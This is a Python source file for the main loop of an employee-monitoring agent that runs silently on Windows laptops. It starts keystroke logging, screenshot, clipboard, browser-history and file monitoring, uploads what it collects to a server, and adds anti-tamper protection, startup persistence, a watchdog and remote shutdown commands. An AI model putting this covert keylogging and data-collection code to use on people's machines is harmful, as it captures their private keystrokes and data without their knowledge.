"""
Employee Monitor Agent - Main Entry Point
Orchestrates all monitoring features and runs silently on employee laptops.
"""

import sys
import os
import time
import traceback
import socket
import signal
import atexit
import subprocess
import hashlib
import tempfile
from threading import Thread
from datetime import datetime, timezone

# Add script directory to path for PyInstaller
if getattr(sys, "frozen", False):
    os.chdir(os.path.dirname(sys.executable))
    sys.path.insert(0, os.path.dirname(sys.executable))

from logger import log
from config import config_exists, load_config, update_config

try:
    import win32gui
except ImportError:
    win32gui = None
from setup_window import run_setup_window
from tracker import start_idle_listeners, is_idle, get_active_window
from screenshot import capture_screenshots, cleanup_temp_files
from browser import collect_browser_history
from usb_monitor import usb_monitor_loop
from clipboard import clipboard_monitor_loop
from startup import add_to_startup
from updater import check_and_update, VERSION
from tray import start_tray, set_connected
from watchdog import ensure_watchdog_running
from anti_tamper import apply_all_protections
from software import check_new_software
from offline_queue import (
    init_db, queue_activity, queue_screenshot, queue_event,
    get_pending_activities, get_pending_screenshots, get_pending_events,
    mark_synced, cleanup_old_synced,
)
import api
import keylogger
import file_monitor
import print_monitor
import live_screen
import blocker

import threading
import ctypes as _ctypes

# ─── Single-Instance Guard ────────────────────────────────────────────────────
# Prevent multiple copies of the agent from running simultaneously.
# The named mutex is process-scoped; Windows releases it automatically when
# the process exits, so no cleanup is needed.
_MUTEX_NAME = "Global\\EmployeeMonitorAgent_SingleInstance"
_mutex_handle = None


def _acquire_single_instance() -> bool:
    """Create a named Windows mutex.  Returns False if another instance exists."""
    global _mutex_handle
    try:
        handle = _ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
        if _ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            return False
        _mutex_handle = handle
        return True
    except Exception:
        return True  # If we can't check, allow startup


# ─── Global Config (shared across threads) ───────────────────────────────────
_config: dict = {}
_shutdown_reported = False
_last_blocked_sites: list = []   # track last-applied list to avoid redundant writes

# Lock that prevents overlapping _check_remote_command threads from racing
# against each other and issuing duplicate start_live / stop_live calls.
_cmd_lock = threading.Lock()


def _now_iso() -> str:
    return datetime.now(tz=timezone.utc).isoformat()


# ─── Shutdown Reporting ───────────────────────────────────────────────────────

def _sync_blocked_sites() -> None:
    """Apply blockedSites from config to the Windows hosts file if changed."""
    global _last_blocked_sites
    current = list(_config.get("blockedSites", []))
    if current != _last_blocked_sites:
        blocker.apply_blocked_sites(current)
        _last_blocked_sites = current


def _report_shutdown() -> None:
    """Call once on graceful exit to record shutdown event on the server."""
    global _shutdown_reported
    if _shutdown_reported:
        return
    _shutdown_reported = True
    try:
        if _config.get("agentToken"):
            # Flush any buffered errors before shutdown
            from logger import flush_error_buffer
            pending_errors = flush_error_buffer()
            if pending_errors:
                api.send_error_report(_config, pending_errors)
            api.send_shutdown(_config)
            log.info("Shutdown reported to server")
    except Exception as e:
        log.error("Failed to report shutdown: %s", e)
    finally:
        # Remove our hosts-file entries so blocking doesn't persist after exit
        blocker.clear_blocked_sites()


atexit.register(_report_shutdown)


def _sig_handler(sig, frame) -> None:
    _report_shutdown()
    sys.exit(0)


signal.signal(signal.SIGTERM, _sig_handler)
try:
    signal.signal(signal.SIGINT, _sig_handler)
except Exception:
    pass

# Windows-specific: catch shutdown/logoff/close events
try:
    import win32api
    import win32con

    def _win_ctrl_handler(ctrl_type: int) -> bool:
        if ctrl_type in (
            win32con.CTRL_SHUTDOWN_EVENT,
            win32con.CTRL_LOGOFF_EVENT,
            win32con.CTRL_CLOSE_EVENT,
        ):
            _report_shutdown()
            time.sleep(1)  # Allow request to complete
        return False  # Let Windows default handler run

    win32api.SetConsoleCtrlHandler(_win_ctrl_handler, True)
except Exception:
    pass


# ─── Heartbeat ────────────────────────────────────────────────────────────────

def _is_blocked_site(window_title: str) -> bool:
    """Check if the current window title matches a blocked site."""
    blocked = _config.get("blockedSites", [])
    if not blocked:
        return False
    lower_title = window_title.lower()
    for site in blocked:
        domain = site.lower().replace("https://", "").replace("http://", "").split("/")[0]
        domain_name = domain.split(".")[0]
        if domain in lower_title or (len(domain_name) > 3 and domain_name in lower_title):
            return True
    return False


def _close_blocked_window():
    """Close the foreground window if it's a blocked site."""
    try:
        if win32gui is None:
            return
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            import ctypes
            WM_CLOSE = 0x0010
            ctypes.windll.user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
            log.warning("Closed blocked site window")
    except Exception as e:
        log.error("Failed to close blocked window: %s", e)


def send_heartbeat():
    global _config
    try:
        window = get_active_window()
        idle = is_idle(_config.get("idleThreshold", 5))

        # Block forbidden sites by closing the window
        if _is_blocked_site(window["windowTitle"]):
            log.warning("Blocked site detected: %s", window["windowTitle"])
            _close_blocked_window()

        # Update keylogger context with the current app
        if _config.get("keylogEnabled", False):
            keylogger.set_current_app(window["appName"])

        data = {
            "employeeCode": _config["employeeCode"],
            "appName": window["appName"],
            "windowTitle": window["windowTitle"],
            "isIdle": idle,
            "timestamp": _now_iso(),
        }

        result = api.send_heartbeat(_config, data)

        if result:
            set_connected(True)
            # Update config with server settings
            if "settings" in result:
                server_settings = result["settings"]
                _config.update(server_settings)
                update_config(_config)
                log.debug("Config updated from server")
                # Re-apply blocked sites whenever settings change
                _sync_blocked_sites()
        else:
            set_connected(False)
            # Queue for offline sync
            queue_activity(
                _config["employeeCode"],
                window["appName"],
                window["windowTitle"],
                idle,
                _now_iso(),
            )
    except Exception as e:
        log.error("Heartbeat failed: %s", e)
        set_connected(False)


# ─── Screenshot ───────────────────────────────────────────────────────────────

def capture_and_send_screenshots():
    if not _config.get("screenshotsEnabled", True):
        return

    try:
        quality = _config.get("screenshotQuality", 60)
        paths = capture_screenshots(quality)
        window = get_active_window()

        for i, path in enumerate(paths):
            metadata = {
                "employeeCode": _config["employeeCode"],
                "appName": window["appName"],
                "windowTitle": window["windowTitle"],
                "monitorCount": str(len(paths)),
            }

            result = api.upload_screenshot(_config, path, metadata)
            if not result:
                # Queue for offline sync
                queue_screenshot(
                    _config["employeeCode"],
                    path,
                    window["appName"],
                    window["windowTitle"],
                    len(paths),
                    _now_iso(),
                )
            else:
                log.info("Screenshot %d/%d uploaded", i + 1, len(paths))

        # Clean up temp files (only those that were uploaded)
        cleanup_temp_files(paths)
    except Exception as e:
        log.error("Screenshot capture/send failed: %s", e)


# ─── Browser History ──────────────────────────────────────────────────────────

def collect_and_send_browser_history():
    if not _config.get("browserHistoryEnabled", True):
        return

    try:
        history = collect_browser_history(since_minutes=30)
        if not history:
            return

        result = api.send_browser_history(_config, history)
        if not result:
            queue_event(
                _config["employeeCode"],
                "browser_history",
                {"history": history},
                _now_iso(),
            )
        else:
            log.info("Browser history sent: %d entries", len(history))
    except Exception as e:
        log.error("Browser history collection failed: %s", e)


# ─── Software Check ──────────────────────────────────────────────────────────

def do_software_check():
    try:
        new_list = check_new_software()
        for sw in new_list:
            sw["employeeCode"] = _config["employeeCode"]
            result = api.send_new_software(_config, sw)
            if not result:
                queue_event(_config["employeeCode"], "new_software", sw, _now_iso())
            else:
                log.info("New software reported: %s", sw["softwareName"])
    except Exception as e:
        log.error("Software check failed: %s", e)


# ─── Offline Queue Sync ──────────────────────────────────────────────────────

def sync_offline_queue():
    try:
        # Sync activities
        for item in get_pending_activities():
            result = api.send_heartbeat(_config, {
                "employeeCode": item["employeeCode"],
                "appName": item["appName"],
                "windowTitle": item["windowTitle"],
                "isIdle": item["isIdle"],
                "timestamp": item["timestamp"],
            })
            if result:
                mark_synced("activity_queue", item["id"])

        # Sync screenshots
        for item in get_pending_screenshots():
            if os.path.exists(item["imagePath"]):
                result = api.upload_screenshot(_config, item["imagePath"], {
                    "employeeCode": item["employeeCode"],
                    "appName": item["appName"],
                    "windowTitle": item["windowTitle"],
                    "monitorCount": str(item["monitorCount"]),
                })
                if result:
                    mark_synced("screenshot_queue", item["id"])
                    cleanup_temp_files([item["imagePath"]])
            else:
                mark_synced("screenshot_queue", item["id"])  # File gone, skip

        # Sync events
        for item in get_pending_events():
            event_type = item["eventType"]
            data = item["data"]
            result = None

            if event_type == "browser_history":
                result = api.send_browser_history(_config, data.get("history", []))
            elif event_type == "usb_event":
                result = api.send_usb_event(_config, data)
            elif event_type == "clipboard":
                result = api.send_clipboard(_config, data)
            elif event_type == "new_software":
                result = api.send_new_software(_config, data)

            if result:
                mark_synced("event_queue", item["id"])

        # Cleanup old synced records
        cleanup_old_synced(24)

    except Exception as e:
        log.error("Queue sync failed: %s", e)


# ─── Keylog / File Activity / Print Log Flush ────────────────────────────────

def _flush_keylog():
    try:
        entries = keylogger.get_and_clear()
        for entry in entries:
            api.send_keylog(_config, entry["appName"], entry["keys"])
        if entries:
            log.info("Keylog flushed: %d entries", len(entries))
    except Exception as e:
        log.error("Keylog flush failed: %s", e)


def _flush_file_activity():
    try:
        entries = file_monitor.get_and_clear()
        if entries:
            api.send_file_activity(_config, entries)
            log.info("File activity flushed: %d entries", len(entries))
    except Exception as e:
        log.error("File activity flush failed: %s", e)


def _flush_print_logs():
    try:
        entries = print_monitor.get_and_clear()
        for entry in entries:
            api.send_print_log(
                _config,
                entry["printer"],
                entry["document"],
                entry["pages"],
                entry["appName"],
            )
        if entries:
            log.info("Print logs flushed: %d entries", len(entries))
    except Exception as e:
        log.error("Print log flush failed: %s", e)


# ─── Remote Command Handling ──────────────────────────────────────────────────

def _check_remote_command():
    """Poll for a pending remote command and execute it.

    Uses a non-blocking lock so that if the previous invocation is still
    running (e.g. waiting on a slow network call) the new thread exits
    immediately instead of racing against it.
    """
    if not _cmd_lock.acquire(blocking=False):
        log.debug("Command check already in progress, skipping")
        return

    try:
        result = api.get_pending_command(_config)
        if not result or not result.get("command"):
            return

        cmd = result["command"]
        log.info("Received remote command: %s", cmd)

        if cmd == "lock":
            try:
                import ctypes
                ctypes.windll.user32.LockWorkStation()
                log.info("Workstation locked by remote command")
            except Exception as e:
                log.error("Lock failed: %s", e)

        elif cmd == "shutdown":
            log.info("Shutdown triggered by remote command")
            _report_shutdown()
            try:
                subprocess.run(["shutdown", "/s", "/t", "10"], check=False)
            except Exception as e:
                log.error("Shutdown command failed: %s", e)

        # start_live / stop_live are now handled automatically via
        # WebRTC signaling WebSocket — no polling needed for those commands.

    except Exception as e:
        log.error("Command check failed: %s", e)
    finally:
        _cmd_lock.release()


# ─── Dedicated Fast Command Polling Thread ───────────────────────────────────

def _command_poll_loop() -> None:
    """Poll for remote commands every 5 seconds in a dedicated thread.

    This replaces the old approach of checking commands inside the 60-second
    main loop, which caused up to 60-second delays for live screen start/stop.
    """
    # Wait a bit for config to be fully loaded before starting
    time.sleep(10)
    log.info("Command polling thread started (5s interval)")

    while True:
        try:
            if _config.get("agentToken"):
                _check_remote_command()
        except Exception as e:
            log.error("Command poll loop error: %s", e)
        time.sleep(5)


# ─── USB Event Sender (callback for usb_monitor_loop) ────────────────────────

def _send_usb_event(cfg, event):
    result = api.send_usb_event(cfg, event)
    if not result:
        queue_event(cfg["employeeCode"], "usb_event", event, _now_iso())


# ─── Clipboard Sender (callback for clipboard_monitor_loop) ──────────────────

def _send_clipboard(cfg, data):
    result = api.send_clipboard(cfg, data)
    if not result:
        queue_event(cfg["employeeCode"], "clipboard", data, _now_iso())


# ─── Network Wait ─────────────────────────────────────────────────────────────

def _wait_for_network(timeout: int = 120) -> bool:
    """Wait until the server is reachable before starting monitoring."""
    server_url = _config.get("serverUrl", "")
    host = server_url.replace("https://", "").replace("http://", "").split(":")[0]
    port = 5000
    try:
        port = int(server_url.split(":")[-1].strip("/"))
    except (ValueError, IndexError):
        pass

    log.info("Waiting for network connectivity to %s:%s ...", host, port)
    start = time.time()
    attempt = 0

    while time.time() - start < timeout:
        attempt += 1
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock.close()
            log.info("Network ready after %.1f seconds (%d attempts)", time.time() - start, attempt)
            return True
        except OSError:
            log.debug("Network not ready yet (attempt %d), retrying in 5s...", attempt)
            time.sleep(5)

    log.warning("Network wait timed out after %ds — starting in offline mode", timeout)
    return False


# ─── Self-Update via AgentVersion API ────────────────────────────────────────

CURRENT_VERSION = "1.0.0"


def check_for_update(server_url: str) -> None:
    """Check /api/agent/latest-version, download + verify + launch if newer."""
    try:
        import requests as _req
        res = _req.get(f"{server_url}/api/agent/latest-version", timeout=5)
        if res.status_code != 200:
            log.debug("Update check returned %s", res.status_code)
            return
        data = res.json()
        if data.get("version") == CURRENT_VERSION:
            log.info("Agent is up to date (%s)", CURRENT_VERSION)
            return

        log.info("New version available: %s (current: %s) — downloading", data["version"], CURRENT_VERSION)
        tmp = os.path.join(tempfile.gettempdir(), "EMUpdate.exe")
        r = _req.get(data["downloadUrl"], stream=True, timeout=60)
        with open(tmp, "wb") as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)

        sha256 = hashlib.sha256()
        with open(tmp, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)

        if sha256.hexdigest() != data["checksum"]:
            log.error("Checksum mismatch — aborting update")
            os.remove(tmp)
            return

        log.info("Checksum OK — launching updater and exiting")
        subprocess.Popen([tmp])
        sys.exit(0)
    except Exception as e:
        log.warning("Update check failed: %s", e)


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    global _config

    # 0. Single-instance check — exit immediately if already running
    if not _acquire_single_instance():
        log.warning("Another instance of EmployeeMonitor is already running — exiting.")
        sys.exit(0)

    log.info("=" * 60)
    log.info("Employee Monitor Agent v%s starting", VERSION)
    log.info("=" * 60)

    # 1. Check if first run
    if not config_exists():
        log.info("First run detected, showing setup window")
        run_setup_window()

    # 2. Load config
    _config = load_config()
    if not _config.get("agentToken"):
        log.error("No agent token in config, running setup")
        run_setup_window()
        _config = load_config()

    log.info("Agent configured for %s at %s", _config.get("employeeCode"), _config.get("serverUrl"))

    # 2b. Check for newer installer version (non-blocking — exits if update found)
    check_for_update(_config.get("serverUrl", "http://localhost:5001"))

    # 3. Wait for network connectivity (important on boot)
    _wait_for_network(timeout=120)

    # 3b. Verify the stored token is still valid.
    # This handles the case where an employee was deleted and re-created:
    # config.json exists with an old token, so the setup window was skipped above,
    # but the token is now rejected by the server.  Show setup again so the user
    # can enter the new employee code / token.
    _verify_result = api.verify_token(_config)
    if _verify_result and not _verify_result.get("valid") and _verify_result.get("error") == "auth":
        log.warning("Stored token is invalid or employee is disabled — re-running setup")
        run_setup_window()
        _config = load_config()
        log.info("Re-configured for %s at %s", _config.get("employeeCode"), _config.get("serverUrl"))

    # 3c. Enforce any blocked sites that were stored in the local config
    _sync_blocked_sites()

    # 4. Apply anti-tamper protections
    _exe_handle = apply_all_protections()

    # 5. Add to Windows startup
    add_to_startup()

    # 6. Initialize offline queue DB
    init_db()

    # 7. Start system tray (separate thread)
    tray_thread = Thread(target=start_tray, daemon=True)
    tray_thread.start()

    # 8. Start idle detection listeners
    start_idle_listeners()

    # 9. Start USB monitoring (separate thread)
    usb_thread = Thread(target=usb_monitor_loop, args=(_config, _send_usb_event), daemon=True)
    usb_thread.start()

    # 10. Start clipboard monitoring (separate thread)
    if _config.get("clipboardEnabled", False):
        clip_thread = Thread(
            target=clipboard_monitor_loop,
            args=(_config, get_active_window, _send_clipboard),
            daemon=True,
        )
        clip_thread.start()

    # 11. Check for updates (separate thread)
    update_thread = Thread(target=check_and_update, args=(_config,), daemon=True)
    update_thread.start()

    # 12. Ensure watchdog is running
    ensure_watchdog_running()

    # 13. Initial software scan (so first check has baseline)
    Thread(target=do_software_check, daemon=True).start()

    # 14. Start keylogger if enabled
    if _config.get("keylogEnabled", False):
        keylogger.start_keylogger()

    # 15. Start file monitor if enabled
    if _config.get("fileMonitorEnabled", False):
        file_monitor.start_file_monitor()

    # 16. Start print monitor if enabled
    if _config.get("printMonitorEnabled", False):
        print_monitor.start_print_monitor()

    # 17. ── Start dedicated fast command polling thread (lock / shutdown) ──────
    cmd_poll_thread = Thread(target=_command_poll_loop, daemon=True, name="CommandPoller")
    cmd_poll_thread.start()

    # 18. ── Start WebRTC signaling client for live screen P2P streaming ───────
    # Runs in background asyncio thread; reconnects automatically.
    # Video frames flow directly agent → admin browser (server is signaling only).
    live_screen.start_signaling(_config)

    # Main loop
    last_screenshot = 0
    last_browser = 0
    last_software = 0
    last_queue_sync = 0
    last_keylog_flush = 0
    last_file_flush = 0
    last_print_flush = 0
    last_error_flush = 0

    log.info("Main monitoring loop started")

    while True:
        try:
            now = time.time()

            # Activity heartbeat every 60s
            send_heartbeat()

            # Screenshot every screenshotInterval minutes
            interval = _config.get("screenshotInterval", 10) * 60
            if now - last_screenshot > interval:
                Thread(target=capture_and_send_screenshots, daemon=True).start()
                last_screenshot = now

            # Browser history every 30 minutes
            if now - last_browser > 1800:
                Thread(target=collect_and_send_browser_history, daemon=True).start()
                last_browser = now

            # Software check every 60 minutes
            if now - last_software > 3600:
                Thread(target=do_software_check, daemon=True).start()
                last_software = now

            # Sync offline queue every 5 minutes
            if now - last_queue_sync > 300:
                Thread(target=sync_offline_queue, daemon=True).start()
                last_queue_sync = now

            # Flush keylog every 60 seconds
            if now - last_keylog_flush > 60:
                if _config.get("keylogEnabled", False):
                    Thread(target=_flush_keylog, daemon=True).start()
                last_keylog_flush = now

            # Flush file activity every 60 seconds
            if now - last_file_flush > 60:
                if _config.get("fileMonitorEnabled", False):
                    Thread(target=_flush_file_activity, daemon=True).start()
                last_file_flush = now

            # Flush print logs every 60 seconds
            if now - last_print_flush > 60:
                Thread(target=_flush_print_logs, daemon=True).start()
                last_print_flush = now

            # Flush error report every 5 minutes
            if now - last_error_flush > 300:
                def _flush_errors():
                    from logger import flush_error_buffer
                    errors = flush_error_buffer()
                    if errors:
                        api.send_error_report(_config, errors)
                Thread(target=_flush_errors, daemon=True).start()
                last_error_flush = now

            # Dynamically start monitors if settings changed to enable them
            if _config.get("keylogEnabled", False) and keylogger._listener is None:
                keylogger.start_keylogger()
            if _config.get("fileMonitorEnabled", False) and file_monitor._observer is None:
                file_monitor.start_file_monitor()
            if _config.get("printMonitorEnabled", False):
                pass  # print monitor always polls if WMI available

            # Ensure watchdog is alive
            ensure_watchdog_running()

        except Exception as e:
            log.error("Main loop error: %s\n%s", e, traceback.format_exc())

        time.sleep(60)


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as e:
        log.error("Fatal error: %s\n%s", e, traceback.format_exc())
        # Watchdog will restart us
        sys.exit(1)